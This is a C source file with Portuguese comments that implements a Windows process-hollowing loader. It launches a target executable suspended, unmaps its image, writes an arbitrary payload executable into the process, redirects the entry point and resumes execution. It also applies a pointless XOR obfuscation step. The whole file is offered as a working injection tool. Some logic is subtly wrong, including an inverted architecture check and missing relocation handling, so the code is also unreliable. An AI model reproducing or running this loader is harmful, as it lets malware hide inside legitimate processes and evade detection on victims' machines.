#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

// Função para aplicar XOR no payload
void xor_encrypt_decrypt(BYTE *data, SIZE_T data_len, BYTE *key, SIZE_T key_len) {
    for (SIZE_T i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// Função para gerar chave XOR aleatória
void generate_xor_key(BYTE *key, SIZE_T key_len) {
    for (SIZE_T i = 0; i < key_len; i++) {
        key[i] = (BYTE)(rand() ^ GetTickCount());
    }
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Uso: %s <caminho_para_payload.exe> <caminho_para_alvo.exe>\n", argv[0]);
        return -1;
    }

    const char* payloadPath = argv[1];
    const char* targetPath = argv[2];

    // Inicializa estruturas
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    // Lê payload
    HANDLE hPayload = CreateFileA(payloadPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPayload == INVALID_HANDLE_VALUE) {
        printf("Erro ao abrir payload: %lu\n", GetLastError());
        return -1;
    }

    DWORD payloadSize = GetFileSize(hPayload, NULL);
    if (payloadSize == INVALID_FILE_SIZE) {
        printf("Erro ao obter tamanho do payload: %lu\n", GetLastError());
        CloseHandle(hPayload);
        return -1;
    }

    BYTE* payloadBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, payloadSize);
    if (!payloadBuffer) {
        printf("Erro ao alocar memória para payload\n");
        CloseHandle(hPayload);
        return -1;
    }

    DWORD bytesRead;
    if (!ReadFile(hPayload, payloadBuffer, payloadSize, &bytesRead, NULL) || bytesRead != payloadSize) {
        printf("Erro ao ler payload: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        CloseHandle(hPayload);
        return -1;
    }
    CloseHandle(hPayload);

    // Aplica ofuscação XOR
    BYTE xorKey[16];
    generate_xor_key(xorKey, sizeof(xorKey));
    xor_encrypt_decrypt(payloadBuffer, payloadSize, xorKey, sizeof(xorKey));

    // Verifica headers PE
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Payload não é um executável PE válido\n");
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payloadBuffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("Headers NT inválidos\n");
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // Verifica arquitetura
    BOOL isTarget64Bit = ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;

    // Cria processo suspenso
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Erro CreateProcess: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // Verifica arquitetura do processo alvo
    BOOL isProcess64Bit;
    if (!IsWow64Process(pi.hProcess, &isProcess64Bit)) {
        printf("Erro ao verificar arquitetura do processo: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }
    if ((isTarget64Bit && isProcess64Bit) || (!isTarget64Bit && !isProcess64Bit)) {
        printf("Arquitetura compatível\n");
    } else {
        printf("Erro: Arquitetura do payload e do alvo não compatíveis\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // Obtém NtUnmapViewOfSection dinamicamente
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("Erro ao obter handle da ntdll: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (!NtUnmapViewOfSection) {
        printf("Erro ao resolver NtUnmapViewOfSection: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // Desmapeia imagem original
    LPVOID imageBase = (LPVOID)ntHeaders->OptionalHeader.ImageBase;
    NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, imageBase);
    if (!NT_SUCCESS(status)) {
        printf("Erro ao desmapear imagem: 0x%08X\n", status);
        // Prossegue, pois o endereço pode estar ocupado; tenta relocação
        imageBase = NULL;
    }

    // Descriptografa payload antes da injeção
    xor_encrypt_decrypt(payloadBuffer, payloadSize, xorKey, sizeof(xorKey));

    // Aloca memória remota (tenta ImageBase, senão reloca)
    LPVOID remoteImage = VirtualAllocEx(pi.hProcess, imageBase, ntHeaders->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteImage) {
        printf("Erro ao alocar memória remota: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // Copia headers
    if (!WriteProcessMemory(pi.hProcess, remoteImage, payloadBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
        printf("Erro ao copiar headers: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteImage, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // Copia seções com permissões específicas
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID localAddr = payloadBuffer + section[i].PointerToRawData;
        LPVOID remoteAddr = (LPVOID)((LPBYTE)remoteImage + section[i].VirtualAddress);
        if (!WriteProcessMemory(pi.hProcess, remoteAddr, localAddr, section[i].SizeOfRawData, NULL)) {
            printf("Erro ao copiar seção %s: %lu\n", section[i].Name, GetLastError());
            VirtualFreeEx(pi.hProcess, remoteImage, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, payloadBuffer);
            return -1;
        }

        // Ajusta permissões da seção
        DWORD protect = (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? PAGE_EXECUTE :
                        (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
        DWORD oldProtect;
        VirtualProtectEx(pi.hProcess, remoteAddr, section[i].SizeOfRawData, protect, &oldProtect);
    }

    // Ajusta contexto da thread
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("Erro ao obter contexto da thread: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteImage, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // Ajusta ponto de entrada (Rcx para x64, Ecx para x86)
    if (isTarget64Bit) {
        ctx.Rcx = (ULONGLONG)((LPBYTE)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    } else {
        ctx.Ecx = (DWORD)((LPBYTE)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    }

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("Erro ao definir contexto da thread: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteImage, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // Retoma thread
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("Erro ao retomar thread: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteImage, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    printf("[+] Hollowing concluído. PID: %lu\n", pi.dwProcessId);

    // Cleanup
    HeapFree(GetProcessHeap(), 0, payloadBuffer);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}